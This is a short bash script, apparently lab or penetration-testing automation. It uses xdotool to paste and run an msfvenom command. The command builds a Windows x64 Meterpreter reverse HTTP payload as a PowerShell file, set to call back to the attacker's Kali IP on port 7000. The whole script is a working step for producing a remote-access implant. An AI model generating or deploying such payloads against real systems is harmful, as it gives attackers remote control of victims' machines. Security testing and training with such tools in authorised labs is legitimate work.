#!/bin/bash

: '
Create PS1 file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${KALI_IP} LPORT=7000 -f psh -o meterpreter-64.ps1"
xdotool key Return